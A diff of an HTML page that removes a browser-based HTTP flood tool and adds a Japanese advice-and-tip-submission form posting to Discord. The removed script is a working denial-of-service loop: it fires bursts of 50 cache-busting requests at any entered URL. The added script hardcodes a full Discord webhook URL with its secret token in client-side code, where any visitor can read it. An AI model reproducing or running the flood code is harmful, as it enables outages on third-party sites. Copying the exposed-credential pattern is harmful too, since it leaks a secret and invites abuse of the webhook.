@@ -1,48 +1,199 @@
 <!DOCTYPE html>
-<html>
+<html lang="ja">
 <head>
-    <title>Console Interface v3.1</title>
+    <meta charset="UTF-8">
+    <title>なんでも相談＆情報提供フォーム</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; }
-        #terminal { width: 80%; margin: 50px auto; border: 2px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; }
-        input { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 60%; margin: 10px; }
-        button { background: #00ff00; color: #000; border: none; padding: 10px 30px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #ff0000; color: #fff; }
-        #stats { font-size: 1.5em; margin-top: 20px; }
+        body {
+            font-family: sans-serif;
+            background: #1e1e2f;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #2a2a3d;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        h1, h2 {
+            border-bottom: 2px solid #4e4e6a;
+            padding-bottom: 10px;
+        }
+        .form-section {
+            margin-bottom: 40px;
+        }
+        label {
+            display: block;
+            margin-top: 15px;
+            margin-bottom: 5px;
+            color: #b0b0d0;
+        }
+        input[type="text"], select, textarea {
+            width: 100%;
+            padding: 10px;
+            background: #1e1e2f;
+            border: 1px solid #4e4e6a;
+            color: #fff;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        textarea {
+            resize: vertical;
+            height: 100px;
+        }
+        button {
+            margin-top: 20px;
+            background: #5865F2;
+            color: #white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #4752C4;
+        }
+        .warning {
+            font-size: 12px;
+            color: #ff6b6b;
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
-    <div id="terminal">
-        <h1>SYSTEM_OVERRIDE_INITIATED</h1>
-        <p>ENTER TARGET URL TO START DIAGNOSTICS</p>
-        <input type="text" id="target" value="https://">
-        <br>
-        <button id="fireBtn" onclick="run()">ACTIVATE</button>
-        <div id="stats">PACKETS SENT: <span id="counter">0</span></div>
+
+<div class="container">
+    <!-- なんでも相談フォーム -->
+    <div class="form-section">
+        <h1>なんでも相談フォーム</h1>
+        <form id="consultForm">
+            <label for="consultInsta">Instagram ID</label>
+            <input type="text" id="consultInsta" required placeholder="@username">
+
+            <label for="consultMessage">お悩み・して欲しいこと</label>
+            <textarea id="consultMessage" required placeholder="相談内容をここに書けよ"></textarea>
+
+            <label for="consultPayment">支払うもの</label>
+            <select id="consultPayment">
+                <option value="情報">情報</option>
+                <option value="お金（最高金額）">お金（最高金額）</option>
+            </select>
+
+            <div class="warning">※危険性のあるものやイタズラ、悪質な内容と判断した場合は反応・対応しません。</div>
+
+            <button type="submit">相談を送信する</button>
+        </form>
     </div>
 
-    <script>
-        let active = false;
-        let total = 0;
-        function run() {
-            if (active) { active = false; document.getElementById('fireBtn').innerText = 'ACTIVATE'; return; }
-            const addr = document.getElementById('target').value;
-            if (!addr.startsWith('http')) return alert('URLを入力してください');
-            active = true;
-            document.getElementById('fireBtn').innerText = 'DEACTIVATE';
-            attack(addr);
+    <hr style="border: 0; border-top: 1px solid #4e4e6a; margin: 40px 0;">
+
+    <!-- 情報提供フォーム -->
+    <div class="form-section">
+        <h2>情報提供ルーム</h2>
+        <form id="infoForm">
+            <label for="infoSender">送信者（Instagram ID または 匿名）</label>
+            <input type="text" id="infoSender" required placeholder="@username または 匿名">
+
+            <label for="infoContent">情報の内容</label>
+            <textarea id="infoContent" required placeholder="ヤバい情報とか教えてくれよ"></textarea>
+
+            <label for="infoImage">画像（任意）</label>
+            <input type="file" id="infoImage" accept="image/*" style="color: #b0b0d0;">
+
+            <button type="submit">情報を送信する</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1544319511082307584/jiK59EdOIzTkEZ0_KWF30XrFjjq6w2RkpZO9hwBRIjd1Lk58wBfou-jI2U1mpy57MKFw";
+
+    // なんでも相談の送信処理
+    document.getElementById('consultForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const insta = document.getElementById('consultInsta').value;
+        const message = document.getElementById('consultMessage').value;
+        const payment = document.getElementById('consultPayment').value;
+
+        const payload = {
+            content: "🚨 **【新着・なんでも相談】** 🚨\n" +
+                     `> **インスタID:** ${insta}\n` +
+                     `> **支払うもの:** ${payment}\n` +
+                     `> **お悩み内容:**\n${message}`
+        };
+
+        try {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            alert('相談を送信したよ！');
+            document.getElementById('consultForm').reset();
+        } catch (err) {
+            alert('送信に失敗したみたい…。');
+            console.error(err);
         }
-        async function attack(url) {
-            while (active) {
-                // 同時に50発の並列リクエストを生成
-                const burst = Array.from({ length: 50 }, () => 
-                    fetch(`${url}?z=${Math.random().toString(36)}`, { mode: 'no-cors', cache: 'no-store' })
-                );
-                await Promise.allSettled(burst);
-                total += 50;
-                document.getElementById('counter').innerText = total;
+    });
+
+    // 情報提供の送信処理
+    document.getElementById('infoForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const sender = document.getElementById('infoSender').value;
+        const content = document.getElementById('infoContent').value;
+        const imageFile = document.getElementById('infoImage').files[0];
+
+        // 画像がある場合はFormDataを使う（Discordの仕様上、ファイル添付はmultipart/form-dataが必要）
+        if (imageFile) {
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify({
+                content: "🔥 **【新着・情報提供】** 🔥\n" +
+                         `> **送信者:** ${sender}\n` +
+                         `> **情報内容:**\n${content}`
+            }));
+            formData.append('file', imageFile);
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+                alert('情報提供ありがとう！画像付きで送っといたぞ。');
+                document.getElementById('infoForm').reset();
+            } catch (err) {
+                alert('送信に失敗した…。');
+                console.error(err);
+            }
+        } else {
+            // 画像がない場合は通常のJSONで送る
+            const payload = {
+                content: " **【情報提供】** \n" +
+                         `> **送信者:** ${sender}\n` +
+                         `> **情報内容:**\n${content}`
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                alert('情報提供ありがとう！');
+                document.getElementById('infoForm').reset();
+            } catch (err) {
+                alert('送信に失敗した…。');
+                console.error(err);
             }
         }
-    </script>
+    });
+</script>
+
 </body>
 </html>
